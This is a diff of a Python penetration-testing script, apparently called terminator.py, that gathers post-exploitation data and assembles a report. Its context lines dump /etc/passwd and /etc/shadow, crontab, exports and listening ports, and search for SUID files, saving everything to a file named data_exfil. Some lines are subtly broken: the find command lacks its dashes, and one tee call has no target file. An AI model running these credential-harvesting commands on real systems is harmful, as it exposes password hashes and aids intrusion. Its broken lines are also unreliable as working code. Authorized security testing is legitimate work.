@@ -591,26 +591,38 @@ def extract(username,password,local_ip,local_port):
    os.system("netstat -tnpl | tee -a /tmp/data_exfil.txt")
 
    print("\n### /etc/passwd: ###")
+   os.system("echo '' >> /tmp/data_exfil.txt")
+   os.system("echo '' >> /tmp/data_exfil.txt")
    os.system("echo '/etc/passwd:' >> /tmp/data_exfil.txt")
    os.system("cat /etc/passwd | tee -a /tmp/data_exfil.txt")
 
    print("\n### /etc/shadow: ###")
+   os.system("echo '' >> /tmp/data_exfil.txt")
+   os.system("echo '' >> /tmp/data_exfil.txt")
    os.system("echo '/etc/shadow:' >> /tmp/data_exfil.txt")
    os.system("cat /etc/shadow | tee -a /tmp/data_exfil.txt")
 
    print("\n### /etc/hosts: ###")
+   os.system("echo '' >> /tmp/data_exfil.txt")
+   os.system("echo '' >> /tmp/data_exfil.txt")
    os.system("echo '/etc/hosts:' >> /tmp/data_exfil.txt")
    os.system("cat /etc/hosts | tee -a")
 
    print("\n### /etc/crontab: ###")
+   os.system("echo '' >> /tmp/data_exfil.txt")
+   os.system("echo '' >> /tmp/data_exfil.txt")
    os.system("echo '/etc/crontab:' >> /tmp/data_exfil.txt")
    os.system("cat /etc/crontab | tee -a /tmp/data_exfil.txt")
 
    print("\n### /etc/exports: ###")
+   os.system("echo '' >> /tmp/data_exfil.txt")
+   os.system("echo '' >> /tmp/data_exfil.txt")
    os.system("echo '/etc/exports:' >> /tmp/data_exfil.txt")
    os.system("cat /etc/exports 2>/dev/null | tee -a /tmp/data_exfil.txt")
 
    print("\n### SUID files: ###")
+   os.system("echo '' >> /tmp/data_exfil.txt")
+   os.system("echo '' >> /tmp/data_exfil.txt")
    os.system("echo 'suid files:' >> /tmp/data_exfil.txt")
    os.system("find / type -f perm /4000 2>/dev/null | tee -a /tmp/data_exfil.txt")
 
@@ -733,7 +745,6 @@ def report(output):
    os.system("echo '--- END OF REPORT ---' >> /terminator/report.txt")
    os.system("mv /terminator/report.txt /terminator/{}".format(output))
    print("### penetration test report for {} is ready at /terminator/{} ###\nplease add your method for gaining the initial shell in the '+ + + Stage 2 - Exploitation / Initial Shell + + +' section.\nall reference data for enumeration, privilege escalation, and persistence/data exfiltration are located in /terminator/ as enum.txt, priv.txt, and data_exfil.txt, respectively.".format(ip,output))
-   print("\n\n-+- {} has been terminated -+-".format(ip))
    ipf.close()
 
 
@@ -744,6 +755,8 @@ def lib_check():
       "docx" in sys.modules
    except:
       return False
+   else:
+      return True
 
 
 # make Word (docx) file and fill with contents from terminator.py output
@@ -874,5 +887,6 @@ elif module == "report":
       doc_make(output)
    else:
       print("\n*** 'python-docx' is not installed on your machine; please run 'pip install python-docx' in your terminal ***")
+   print("\n\n-+- {} has been terminated -+-".format(ip))
 else:
    print("\n*** specify either 'enum', 'priv', 'root' or 'report' ***")
